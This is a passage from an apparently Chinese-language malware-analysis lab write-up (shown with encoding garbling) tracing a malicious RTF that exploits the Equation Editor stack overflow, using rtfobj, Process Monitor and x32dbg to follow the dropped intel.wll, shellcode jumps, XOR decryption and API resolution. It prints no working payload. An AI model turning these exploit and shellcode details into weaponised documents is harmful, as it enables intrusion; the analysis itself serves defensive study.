</span></span><span style=display:flex><span>File Access Date/Time           : 2024:02:29 16:55:48+08:00
</span></span><span style=display:flex><span>File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
</span></span><span style=display:flex><span>File Permissions                : -rwxrwxrwx
</span></span><span style=display:flex><span>File Type                       : RTF
</span></span><span style=display:flex><span>File Type Extension             : rtf
</span></span><span style=display:flex><span>MIME Type                       : text/rtf
</span></span><span style=display:flex><span>Warning                         : Unsupported RTF encoding cp936. Will assume Latin.
</span></span><span style=display:flex><span>Last Modified By                : Koby
</span></span><span style=display:flex><span>Create Date                     : 2019:12:24 10:28:00
</span></span><span style=display:flex><span>Modify Date                     : 2019:12:24 10:28:00
</span></span><span style=display:flex><span>Revision Number                 : <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Total Edit Time                 : <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Pages                           : <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Words                           : <span style=color:#ae81ff>252</span>
</span></span><span style=display:flex><span>Characters                      : <span style=color:#ae81ff>1441</span>
</span></span><span style=display:flex><span>Characters With Spaces          : <span style=color:#ae81ff>1690</span>
</span></span><span style=display:flex><span>Internal Version Number         : <span style=color:#ae81ff>117</span>
</span></span><span style=display:flex><span>$ stat 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>  File: 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>  Size: <span style=color:#ae81ff>222012</span>          Blocks: <span style=color:#ae81ff>440</span>        IO Block: <span style=color:#ae81ff>4096</span>   regular file
</span></span><span style=display:flex><span>Device: 66h/102d        Inode: <span style=color:#ae81ff>2814749767539972</span>  Links: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Access: <span style=color:#f92672>(</span>0777/-rwxrwxrwx<span style=color:#f92672>)</span>  Uid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>   Gid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Access: 2024-02-29 16:55:48.947690500 +0800
</span></span><span style=display:flex><span>Modify: 2023-08-14 11:54:52.000000000 +0800
</span></span><span style=display:flex><span>Change: 2024-02-29 16:55:48.947690500 +0800
</span></span><span style=display:flex><span> Birth: -</span></span></code></pre></div>:::</li><li>é€™ä¸€é¡Œåœ¨æ²’æœ‰çœ‹VirusTotalæˆ–æ˜¯Any.Runçš„æƒ…æ³ä¹‹ä¸‹ï¼Œæˆ‘åœ¨local VMå…§çœŸçš„çœ‹ä¸å‡ºä¾†æœ‰ä»€éº¼å•é¡Œï¼Œå¾Œä¾†å¿ä¸ä½ä¸Šç¶²çœ‹ä¸€ä¸‹ç›¸é—œçš„hashï¼Œç™¼ç¾ä»–æ˜¯ä½¿ç”¨==CVE-2017-11882==é€™å€‹ç”±Microsoftæå‡ºçš„æ¼æ´é–‹ç™¼å‡ºä¾†çš„malware file<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup>ï¼Œè€Œæ¯”è¼ƒæ–°çš„ç‰ˆæœ¬å¤§éƒ¨åˆ†éƒ½å·²ç¶“è¢«patchäº†ï¼Œæ‰€ä»¥æˆ‘åœ¨VMå…§æ‰æœƒæ‰¾ä¸å‡ºç›¸é—œçš„æ”»æ“Šç—•è·¡(æµªè²»äº†å¾ˆå¤šæ™‚é–“)
<a href=#R-image-0dc57f171528caa8687cc57ed767bce8 class=lightbox-link><img alt="è¢å¹•æ“·å–ç•«é¢ 2024-03-05 135304" class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HkR0X4V66.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-0dc57f171528caa8687cc57ed767bce8><img alt="è¢å¹•æ“·å–ç•«é¢ 2024-03-05 135304" class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HkR0X4V66.png></a>
å¾ä¸Šåœ–ä¾†çœ‹ï¼Œæ²’æœ‰çœ‹åˆ°ä»»ä½•åŸ·è¡ŒEQNEDT32.EXEçš„processï¼Œç‚ºäº†èƒ½å¤ åœ¨localç«¯å¯¦éš›çœ‹åˆ°æ”»æ“Šçš„è»Œè·¡ï¼Œæˆ‘å¾å­¸æ ¡çš„æˆæ¬Šè»Ÿé«”ç¶²ç«™ä¸­ä¸‹è¼‰äº†Office 2016(åŸæœ¬æ˜¯2021)ï¼Œæ‰ç™¼ç¾ç›¸é—œçš„patché‚„æ²’æ™®åŠåˆ°é€™å€‹ç‰ˆæœ¬(æ˜¯ä¸æ˜¯è¦é€šå ±ä¸€ä¸‹è¨ˆä¸­å‘¢??ğŸ¤”)
<a href=#R-image-69dc1c08ba67e52b44ff53bbdf9d512d class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/H1NNEE4p6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-69dc1c08ba67e52b44ff53bbdf9d512d><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/H1NNEE4p6.png></a>
:::danger
é€™å€‹CVEæ˜¯éŒ¯çš„ï¼Œå’ŒEQNEDT32.EXEæœ‰é—œçš„CVEæœ‰ä¸‰å€‹:
CVE-2017-11882
CVE-2018-0802
CVE-2018-0798
æ‰€ä»¥å…¶å¯¦ä¸æ˜¯ç›®å‰çš„é€™ä¸€å€‹ï¼Œé€™ä¹Ÿè­‰æ˜äº†æˆ‘æ‰¾è¶…ä¹…éƒ½æ²’æœ‰æ‰¾åˆ°çš„EQNEDT32.EXEçš„æ´æ˜¯å“ªè£¡
:::</li></ol><h3 id=åŸ·è¡Œæµç¨‹-1>åŸ·è¡Œæµç¨‹</h3><p>:::info
å› ç‚ºé€™ä¸€é¡Œæˆ‘æ˜¯åœ¨å·²çŸ¥æ¼æ´CVEçš„å‰æä¸‹é€²è¡Œåˆ†æï¼Œæ‰€ä»¥æˆ‘æœƒå…ˆå‡è£åœ¨ä¸çŸ¥é“çš„æƒ…æ³ä¸‹ï¼Œæ•˜è¿°æˆ‘å¯èƒ½æœƒå¦‚ä½•åˆ†æï¼Œå¦‚æœé€”ä¸­æœ‰æŸå€‹åœ°æ–¹æ˜¯æˆ‘ä¸çŸ¥é“å¦‚ä½•ç¹¼çºŒé€²è¡Œæˆ–æ˜¯æŸå€‹background knowledgeæˆ‘ä¸€å®šå…ˆçŸ¥é“ï¼Œæˆ‘æœƒæ¨™è¨»å…¶ä¸­
:::
:::danger
å› ç‚ºä¸èƒ½ä½¿ç”¨ç·šä¸Šsandbox toolsï¼Œæ‰€ä»¥å…¶å¯¦æ‡‰è©²è¦æœ‰command senseæ˜¯ç›´æ¥ä½¿ç”¨RTFOBJé€²è¡ŒParsingï¼Œä¸¦ä¸”é‡å°Embeddedçš„Fileå»OSINTä»–å°±å¯èƒ½å¯ä»¥ä¸éœ€è¦é€éAnyRunçŸ¥é“ä»–æ˜¯å“ªä¸€å€‹CVEé€ æˆçš„æƒ¡æ„æ¨£æœ¬
:::</p><ol><li><p>Process Monitor
åœ¨åŸ·è¡Œä¸€å€‹å¯ç–‘çš„fileæ™‚ï¼Œæˆ‘æœƒå˜—è©¦å…ˆç”¨process monitorä»¥åŠwiresharkéŒ„è£½å…¶ä¸­ç›¡å¯èƒ½è©³ç´°çš„æ‰€æœ‰éç¨‹(ç•¶ç„¶å¯¦è¡Œå‰ä¸€å®šè¦å…ˆsnapshot)ï¼Œç„¶å¾Œçœ‹ä¸€ä¸‹ä¸­é–“çš„éç¨‹æœ‰ç„¡è§¸åŠåˆ°CreateFileã€WriteFiileä»¥åŠregistryé€™æ¨£çš„æ“ä½œ
ç‚ºäº†è¦æ›´æº–ç¢ºçš„filterä¸å¿…è¦çš„ç´€éŒ„ï¼Œæˆ‘è¨­å®šçš„æ¢ä»¶æ˜¯:</p><ol><li>Operation is WriteFile then Include</li><li>Process Name is Wireshark.exe then Exclude</li><li>Process Name is dumpcap.exe then Exclude
<a href=#R-image-876bc10abe3a492c1fa3986861e9297a class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SJBQ2N4p6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-876bc10abe3a492c1fa3986861e9297a><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SJBQ2N4p6.png></a>
æ¥è‘—æˆ‘å°±ç™¼ç¾æœ‰ä¸€å€‹==EQNEDT32.exe==çš„processå¯«äº†ä¸€å€‹intel.wllçš„æª”æ¡ˆåˆ°<code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll</code>
<a href=#R-image-4966d90191f7ea1208ab19f51043b70e class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HJF9n44p6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-4966d90191f7ea1208ab19f51043b70e><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HJF9n44p6.png></a>
ç•¶ç„¶é€™ä¹Ÿè¦æœ‰è¶³å¤ çš„ç¶“é©—æ‰æœ‰è¾¦æ³•æ›´æº–ç¢ºçš„çŒœæ¸¬é€™æ˜¯ä¸€å€‹å¯èƒ½æœ‰å•é¡Œçš„æ“ä½œï¼Œæ‰€ä»¥é€™ä¸€å€‹processæœ‰ä¸€éƒ¨åˆ†æ˜¯åƒè€ƒç¶²è·¯ä¸ŠCVEçš„èªªæ˜æ‰æ›´ç¢ºå®šé€™å€‹æ–¹å‘æ˜¯å°çš„</li></ol></li><li><p>Analyze EQNEDT32.exe
ç‚ºäº†æ›´é€²ä¸€æ­¥çŸ¥é“æˆ‘çš„æƒ³æ³•æ˜¯å¦æ­£ç¢ºï¼Œæ‰€ä»¥æˆ‘ä¿®æ”¹äº†æˆ‘çš„filter ruleâ†’</p><ol><li>Process Name is EQNEDT32.exe then Include</li><li>Process Name is Wireshark.exe then Exclude</li><li>Process Name is dumpcap.exe then Exclude</li></ol><p>ç™¼ç¾æœ‰å¾ˆå¤šä¸åŒçš„processéƒ½æœ‰BoFçš„å•é¡Œ
<a href=#R-image-efb19f26c4357cc18a8d04a8888a80e9 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SkNnCEN6a.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-efb19f26c4357cc18a8d04a8888a80e9><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SkNnCEN6a.png></a>
è€Œç›´åˆ°æ¯”è¼ƒå¾Œç«¯çš„æ“ä½œæ‰å‡ºç¾CreateFileã€WriteFileã€CloseFileçš„æ“ä½œï¼Œä¸»è¦æ˜¯
<code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll</code>å’Œ<code>C:\Users\REM\AppData\Local\Temp\8.t</code>
<a href=#R-image-73b5c66273b40e11c74508316494fc9b class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rkPe1HVa6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-73b5c66273b40e11c74508316494fc9b><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rkPe1HVa6.png></a></p></li><li><p>æ‰€ä»¥ï¼Œåˆ°ç›®å‰ç‚ºæ­¢å¯ä»¥å¾ˆç¢ºå®šçš„äº‹æƒ…æ˜¯é€™å€‹RTF Fileï¼Œè£¡é¢é‹è—äº†ä¸€äº›æª”æ¡ˆï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—é‡å°é€™å€‹fileé€²è¡Œéœæ…‹çš„åˆ†æï¼Œä½†æ˜¯æˆ‘ç•¶ç„¶çœ‹ä¸æ‡‚officeé‡å°RTFçš„èªæ³•å’Œçµæ§‹ç‚ºä½•ï¼Œæ‰€ä»¥æ ¹æ“š<sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>çš„èªªæ˜æåˆ°å¯ä»¥ç”¨<a href=https://github.com/decalage2/oletools rel=external target=_blank>RTFOBJ</a>é€™å€‹toolï¼Œå¹«å¿™parseå…¶ä¸­çš„å…§å®¹ï¼Œçµæœå¦‚ä¸‹</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ rtfobj -s all 5bbf2643a601e632a49406483c8f
</span></span><span style=display:flex><span>c5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>rtfobj 0.60.1 on Python 3.8.17 - http://decalage.info/python/oletools
</span></span><span style=display:flex><span>THIS IS WORK IN PROGRESS - Check updates regularly!
</span></span><span style=display:flex><span>Please report any issue at https://github.com/decalage2/oletools/issues
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================================</span>
</span></span><span style=display:flex><span>File: <span style=color:#e6db74>&#39;5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9&#39;</span> - size: <span style=color:#ae81ff>222012</span> bytes
</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
</span></span><span style=display:flex><span>id |index     |OLE Object
</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>  |0000E970h |format_id: <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>Embedded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   |          |class name: b<span style=color:#e6db74>&#39;Package&#39;</span>
</span></span><span style=display:flex><span>   |          |data size: <span style=color:#ae81ff>73928</span>
</span></span><span style=display:flex><span>   |          |OLE Package object:
</span></span><span style=display:flex><span>   |          |Filename: <span style=color:#e6db74>&#39;8.t&#39;</span>
</span></span><span style=display:flex><span>   |          |Source path: <span style=color:#e6db74>&#39;C:\\Aaa\\tmp\\8.t&#39;</span>
</span></span><span style=display:flex><span>   |          |Temp path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t&#39;</span>
</span></span><span style=display:flex><span>   |          |MD5 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;8eac8203cf56f2b24753986353deac7e&#39;</span>
</span></span><span style=display:flex><span>   |          |File Type: Unknown file type
</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>  |00032B90h |format_id: <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>Embedded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   |          |class name: b<span style=color:#e6db74>&#39;Equation.2\x00\x124Vx\x90\x124VxvT2&#39;</span>
</span></span><span style=display:flex><span>   |          |data size: <span style=color:#ae81ff>6436</span>
</span></span><span style=display:flex><span>   |          |MD5 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;a09e82c26f94f3a9297377120503a678&#39;</span>
</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>  |00032B76h |Not a well-formed OLE object
</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
</span></span><span style=display:flex><span>Saving file from OLE Package in object <span style=color:#75715e>#0:</span>
</span></span><span style=display:flex><span>  Filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;8.t&#39;</span>
</span></span><span style=display:flex><span>  Source path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;C:\\Aaa\\tmp\\8.t&#39;</span>
</span></span><span style=display:flex><span>  Temp path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t&#39;</span>
</span></span><span style=display:flex><span>  saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t
</span></span><span style=display:flex><span>  md5 8eac8203cf56f2b24753986353deac7e
</span></span><span style=display:flex><span>Saving file embedded in OLE object <span style=color:#75715e>#1:</span>
</span></span><span style=display:flex><span>  format_id  <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>  class name <span style=color:#f92672>=</span> b<span style=color:#e6db74>&#39;Equation.2\x00\x124Vx\x90\x124VxvT2&#39;</span>
</span></span><span style=display:flex><span>  data size  <span style=color:#f92672>=</span> <span style=color:#ae81ff>6436</span>
</span></span><span style=display:flex><span>  saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B90.bin
</span></span><span style=display:flex><span>  md5 a09e82c26f94f3a9297377120503a678
</span></span><span style=display:flex><span>Saving raw data in object <span style=color:#75715e>#2:</span>
</span></span><span style=display:flex><span>  saving object to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B76.raw
</span></span><span style=display:flex><span>  md5 a3540560cf9b92c3bc4aa0ed52767b8a</span></span></code></pre></div><p>æˆ‘ç™¼ç¾å…¶å¯¦å…§è—çš„æª”æ¡ˆå…¶å¯¦æ˜¯<code>8.t</code></p></li><li><p>Analyze RTF Malware File
æˆ‘æƒ³è¦è·Ÿä¸€ä¸‹é€™å€‹RTFå› ç‚ºstack overflowçš„å•é¡Œåˆ°åº•æ˜¯æ€éº¼è®ŠæˆRCEçš„ï¼Œæ‰€ä»¥æˆ‘å…ˆç”¨Proess MonitorçŸ¥é“ä»–æœƒcallåˆ°CreateFileé€™å€‹APIï¼Œå› æ­¤æˆ‘å…ˆç”¨x32dbg attach eqnedt32.exeé€™å€‹fileï¼Œç„¶å¾Œè¨­å®šbreakpointåˆ°kernelbase.dllä¸­çš„CreateFileAé€™å€‹API
<a href=#R-image-400b6423c054834eb123a901c423ce40 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/r12X9ZUpa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-400b6423c054834eb123a901c423ce40><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/r12X9ZUpa.png></a>
æ¥è‘—æˆ‘ç›´æ¥å•Ÿå‹•malware fileï¼Œdbgæœƒåœåœ¨CreateFileä¸Šï¼Œæ­¤æ™‚æˆ‘å›å»çœ‹stackä¸Šçš„return address
<a href=#R-image-9f0b1a6fc7342df3dc7e842d7f0b4c3f class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rJzpc-ITp.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-9f0b1a6fc7342df3dc7e842d7f0b4c3f><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rJzpc-ITp.png></a>
ç™¼ç¾ä»–æœƒreturnåˆ°<code>026A878F</code>é€™å€‹åœ°æ–¹(æ¯ä¸€æ¬¡åŸ·è¡Œæœƒä¸ä¸€æ¨£ï¼Œæœ‰é»é¡ä¼¼ASLRï¼Œä¸éé€šå¸¸æœƒæŠŠè¦åŸ·è¡Œçš„shellcodeæ”¾åœ¨<code>26AXXXX</code>é–‹é ­çš„åœ°æ–¹)ï¼Œé€™å€‹ä½ç½®å­˜çš„æ‡‰è©²å°±æ˜¯ä»–çš„shellcode
<a href=#R-image-6b1f3f312e4a75fdd69ee9996150492b class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/r1v_iWLpT.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-6b1f3f312e4a75fdd69ee9996150492b><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/r1v_iWLpT.png></a></p></li><li><p>è©³ç´°çš„åˆ†ææ€éº¼åšåˆ°é€™ä¸€æ­¥shellcodeçš„
é¦–å…ˆï¼Œæˆ‘å·²ç¶“çŸ¥é“ä»–æ˜¯æ€éº¼åˆ©ç”¨stack overflowçš„æ–¹å¼æ”¾ä¸Šshellcodeï¼Œä½†æ˜¯æˆ‘æ‰¾äº†è¶…ä¹…éƒ½é‚„æ˜¯æ²’æœ‰æ‰¾åˆ°2016ç‰ˆæœ¬çš„æ¼æ´åœ¨å“ªè£¡ï¼Œæ‡‰è©²èªªæ ¹æ“š<sup id=fnref:7><a href=#fn:7 class=footnote-ref role=doc-noteref>7</a></sup>çš„èªªæ˜ï¼Œæˆ‘çŸ¥é“å› ç‚ºåœ¨è¤‡è£½å­—é«”åç¨±çš„æ™‚å€™ï¼Œæ²’æœ‰æª¢æŸ¥å­—çš„é•·åº¦ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨é€™ä¸€é»è“‹åˆ°return addressï¼Œä¹Ÿå°±æ˜¯èªªï¼Œå¯ä»¥è®“ç¨‹å¼è·³åˆ°æˆ‘å€‘é å…ˆè¨­å®šå¥½çš„shellcodeä¸Šé¢ï¼Œé‚£ç‚ºä»€éº¼æ‰¾ä¸åˆ°ä»–æª¢æŸ¥é•·åº¦çš„åœ°æ–¹å‘¢?å› ç‚ºæˆ‘çš„åšæ³•æ˜¯åˆ©ç”¨stackä¸Šçš„backtraceå»çœ‹callå®ŒCreateFileä¹‹å¾Œè¦å›åˆ°å“ªè£¡å»åˆ¤æ–·ä»–æ˜¯ä»€éº¼æ™‚å€™ç¯¡æ”¹äº†return addressï¼Œä½†è·Ÿå®Œå‹•æ…‹ç™¼ç¾ä»–ä¼¼ä¹å¾ˆæ—©å°±å·²ç¶“æŠŠshellcodeæ”¾ä¸Šå»äº†(åªæ˜¯ä»€éº¼æ™‚å€™ä¸å¤ªæ¸…æ¥š)ï¼Œæ‰€ä»¥ç¤™æ–¼æ™‚é–“çš„é—œä¿‚ï¼Œæˆ‘å…ˆå¾€ä¸‹åˆ†æï¼Œè©³ç´°çš„æµç¨‹å¦‚ä¸‹:
<a href=#R-image-fe838091f019f67098d70753f2e7b3e7 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/H1r90hLap.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-fe838091f019f67098d70753f2e7b3e7><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/H1r90hLap.png></a>
åˆ°æœ€å¾Œä»–æœƒåˆ°<code>0x430BFB</code>é€™å€‹ä½ç½®ç„¶å¾Œè·³åˆ°<code>0x268A48C</code>ï¼Œè«‹æ³¨æ„çœ‹ä¸€ä¸‹åº•ä¸‹ä¸€é»çš„codeç•¶ä¸­æœ‰ä¸€å€‹<code>jmp 0x268A4BE</code>ï¼Œé€™å€‹ä¸€è·³éå»å°±æœƒä½¿dbgé‡æ–°ç·¨è­¯éï¼Œé€™ä¹Ÿæ˜¯shellcodeå¾ˆå¸¸ä½¿ç”¨åˆ°çš„æŠ€å·§
<a href=#R-image-1a06d7b35d4a9c6aa727a450da8ebe3c class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/BJaheaI6T.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-1a06d7b35d4a9c6aa727a450da8ebe3c><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/BJaheaI6T.png></a>
<a href=#R-image-d5ffcd621e3bc12ddf8109734c423a70 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/Sy7BbpLa6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-d5ffcd621e3bc12ddf8109734c423a70><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/Sy7BbpLa6.png></a>
è‹¥é †è‘—é€™ä¸€æ¢å¾€ä¸‹åŸ·è¡Œï¼Œä»–retçš„åœ°æ–¹å°±æœƒè®Šæˆï¼Œ==0x26A6E8A==(ç•¶ç„¶æ¯ä¸€æ¬¡éƒ½ä¸ä¸€æ¨£ï¼Œå› ç‚ºæ˜¯å‹•æ…‹çš„)
<a href=#R-image-09566cfc7adfa1f89d224a85d5a2ecca class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HJZhZpUap.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-09566cfc7adfa1f89d224a85d5a2ecca><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HJZhZpUap.png></a></p><hr><ul><li><p>å¾é€™ä¸€æ®µé–‹å§‹å°±æ˜¯æœ‰é—œæ–¼å‘¼å«windows APIçš„éƒ¨åˆ†ï¼Œè€Œä¸”å¯ä»¥çœ‹åˆ°ï¼Œå‰›è·³éå»çš„æ™‚å€™ä¹Ÿæ˜¯ä¸€æ¨£calläº†==0x26A6E8E==ï¼Œè®“çœŸæ­£çš„shellcodeè—åœ¨å…¶ä¸­
<a href=#R-image-5bb20d7f2af16aee87a095dc49b8152f class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SkDJf6Lpp.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-5bb20d7f2af16aee87a095dc49b8152f><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SkDJf6Lpp.png></a></p></li><li><p>Decrypt
é€™ä¸€æ®µæ‡‰è©²å°±æ˜¯åœ¨decryptå¾ŒçºŒçš„shellcodeï¼Œå¯ä»¥çœ‹åˆ°ä»–ä¸æ–·loopåšä¸€ä»¶äº‹æƒ…ï¼Œé‚£å°±æ˜¯XORç›®å‰å–å¾—çš„word bytes(0xC390)ï¼Œç¸½å…±æ‡‰è©²åšäº†0x8BAæ¬¡ï¼Œæ¯æ¬¡æ”¹2 Bytes
<a href=#R-image-dd7a4e9cd0e14ddd6a89287f2f587be2 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/S1gLGp8ap.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-dd7a4e9cd0e14ddd6a89287f2f587be2><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/S1gLGp8ap.png></a>
å¯ä»¥çœ‹åˆ°decryptå¾Œå°±çœŸçš„èƒ½è¾¨è­˜ä¸€äº›å­—å…ƒ
<a href=#R-image-5fc22e7a237639e23bc6c657ee12bd11 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rJtgETLpT.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-5fc22e7a237639e23bc6c657ee12bd11><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rJtgETLpT.png></a>
decryptå®Œçš„codeæˆªåœ–å¦‚ä¸‹ï¼Œé€™æ‰æ˜¯çœŸæ­£çš„shellcode
<a href=#R-image-35f2de1cef540edfde8ddf62df994163 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/BJb9w6Lpp.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-35f2de1cef540edfde8ddf62df994163><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/BJb9w6Lpp.png></a></p></li><li><p>åšçš„äº‹æƒ…å¦‚ä¸‹</p><ol><li><p>è§£æå‡º<code>ntdll.dll</code>å’Œ<code>kernelbase.dll</code>
é€™ä¸€æ®µå¾ˆæœ‰è¶£ï¼Œä»–æ‡‰è©²å°±æ˜¯æˆ‘åœ¨<a href=https://hackmd.io/@SBK6401/Bkd51XRM6 rel=external target=_blank>2023 Lab - WinMalware - Dynamic API Resolution Background</a>ä¸­å­¸åˆ°çš„API ResolutionæŠ€å·§</p><blockquote><p>ä¸é  loaderï¼Œåœ¨ runtime è‡ªè¡Œçˆ¬å–ç³»çµ±çµæ§‹ï¼Œå–å¾—æ‰€éœ€çš„ Windows API</p></blockquote><p><a href=#R-image-4fc52f0a83b1e7dcbe2a3d59d779e52d class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HygbsTU6T.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-4fc52f0a83b1e7dcbe2a3d59d779e52d><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HygbsTU6T.png></a>
ç¬¬ä¸€å€‹ä½¿ç”¨çš„dllæ˜¯<code>msvcrt.dll</code>ï¼Œä»¥æ­¤é¡æ¨ï¼Œæˆ‘å€‘å¯ä»¥æŠŠä¸‹ä¸€å€‹functionç•¶ä½œæ˜¯åœ¨çˆ¬<code>kernel32.dll</code>
